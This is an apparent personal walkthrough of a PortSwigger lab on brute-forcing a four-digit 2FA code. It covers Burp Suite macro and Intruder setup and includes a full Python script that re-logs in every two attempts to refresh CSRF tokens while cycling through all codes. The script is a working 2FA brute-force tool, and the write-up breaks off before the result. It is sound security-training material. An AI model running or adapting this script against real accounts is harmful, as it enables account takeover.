# Lab Brute-forcing 2fa verification codes 2

## Objective:

 This lab's two-factor authentication is vulnerable to brute-forcing. You have already obtained a valid username and password, but do not have access to the user's 2FA verification code. To solve the lab, brute-force the 2FA code and access Carlos's account page.

Victim's credentials: carlos:montoya 
## Start by looking at the login page

![[Pasted image 20210918214804.png]]

![[Pasted image 20210918215000.png]]

After logging in, a new login page at /login2 is displayed

![[Pasted image 20210918214842.png]]

![[Pasted image 20210918215030.png]]

Notice the csrf token values. These are important

I tried a couple of mfa options 0000, and 0001. I noticed that after 2 attempts, I automatically get redirected to the login page. 

To complete this lab, I need to brute force every the mfa code by using every possible option. Since the mfa code is only 4 digits, this is possible .

To do this, I need to use burp macros and session handler options, to create login for every mfa attempt. This would ensure that I would receive a new csrf token value.

1. Go to > Project options 
2. From "Session Handling Rules", click "Add"

![[Pasted image 20210918215525.png]]

I will use Session Handling Rules to login and get a new csrf token when I use burp intruder to brute force the mfa code

3. Click "ADD" to create a new Rule action. This will open a new prompt.

![[Pasted image 20210918215650.png]]

4. Click "Add" to create a new macro

![[Pasted image 20210918215753.png]]

4. Under "Macro Recorder", choose the requests needed for the login.

![[Pasted image 20210918215928.png]]

1. The First GET request to /login is needed to get the csrf and set-cookie value
2. The POST request used the csrf value and set-cookie value and authenticates using the carlos:montoya credentials
3. The third GET request collects the csrg token value from /login2 

The reason I chose those values is because they are needed to receive a valid csrf token for the /login2 page. This is the page where Burp Intruder will be brute forcing the mfa code. 

From the "Scope" tab of the "Session Handling Rule Editor", make sure that "Intruder" and "Include All URL's" is selected. This makes sure that intruder will run this macro on every request. 

![[Pasted image 20210918220349.png]]

The next step is to use intruder to brute force the mfa code

I selected the mfa-code value as the target

![[Pasted image 20210918221043.png]]

I chose the following payload options:

![[Pasted image 20210918221115.png]]

This ensures that every 4 character option from 0-9 is iterated through

![[Pasted image 20210918221206.png]]

Session handling does not take multiple threads too well, so I had to do this 1 thread at a time. 

I started the attack 

![[Pasted image 20210918221342.png]]

The 200 response codes mean that my the csrf tokens are working which means the macros are correctly functioning. 

In the meantime, I wrote a python script to do the same thing. 

-------------------------------------------------------
`
'''
Portswigger lab 2FA bypass using a brute-force attack

This script logs in with the provided credentials to /login.

After this login, the session will get redirected to /login2 which will ask for the MFA code. This code is only 4 digits and can be brute forced.This script will iterate through every option until the MFA code is successful. 

Because of CSRF defense, I will need to relogin every 2 MFA attempts to get a valid CSRF token. 

'''

import sys
import re
import requests
import urllib
import urllib3

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
login2Cookies = []
login2CSRF = []

def mfaBrute(url):
	#brute mfa prompt by attempting every possible option for a 4 digit code(0000,0001,0002,etc). After 2 attempts, login again to get a new valid csrf and token values
	numbers = [0,1,2,3,4,5,6,7,8,9]
	attempt = 1

	for p1 in numbers:
		for p2 in numbers:
			for p3 in numbers:
				for p4 in numbers:
					mfaCode = str(p1) + str(p2) + str(p3) + str(p4)
					cookies = {'session': login2Cookies[-1]}
					data = {'csrf':login2CSRF[-1], 'mfa-code': mfaCode}

					print("Attempting {} with CSRF token of {} and cookie of {}".format(mfaCode,login2CSRF[-1],login2Cookies[-1]))
					p = requests.post(url + "/login2", cookies=cookies,data=data, verify=False, proxies=proxies)

					if "Incorrect security code" not in p.content:
						print("The pin of {} worked!".format(mfaCode))
						exit()

					if attempt % 2 != 0:
						print("Reauthenticating to get new tokens")
						getTokensLogin1(url)
					attempt += 1	

def getCSRF2(url,cookie2):
	#Send get request to /login2 and collect the second csrf token
	cookies = {'session': cookie2}
	r = requests.get(url + "/login2", cookies=cookies, proxies=proxies, verify=False)
	csrf2 = re.findall('[A-Za-z0-9]{32}',str(r.content))[0]
	login2Cookies.append(cookie2)
	login2CSRF.append(csrf2)
	

def getCookie2(url,headers):
	#After authenticating, collect second cookie value for next login mfa prompt page
	cookie2 = re.findall("[A-Za-z0-9]{32}",str(headers))[0]
	getCSRF2(url,cookie2)
	
def authenticateLogin1(url,cookie1,csrf1):
	# Uses the collected information to authenticate
	cookies = {'session': cookie1}
	data= {'csrf': csrf1, 'username': 'carlos', 'password':'montoya'}
	p = requests.post(url + "/login",cookies=cookies,data=data,allow_redirects=False, verify=False, proxies=proxies)
	getCookie2(url,p.headers)

def getTokensLogin1(url):
	# Sends Get request to first login page and saves the cookie and csrf token value
	r = requests.get(url + "/login",verify=False, proxies=proxies)
	cookie1 = re.findall("[A-Za-z0-9]{32}",str(r.headers))[0]
	csrf1 = re.findall("[A-Za-z0-9]{32}",str(r.content))[0]
	authenticateLogin1(url,cookie1,csrf1)
	

def main():
	if len(sys.argv) != 2:
		print("(+) Not enough Arguments")
		print("(+)Example: {} http://example.com".format(sys.argv[0]))
	else:
		url = sys.argv[1]
		getTokensLogin1(url)
		mfaBrute(url)
		
if __name__ == "__main__":
	main()

`
---------------------------------------------------------------------

I used this script to start the attack

![[Pasted image 20210919152333.png]]


Eventually, we get the correct MFA code:

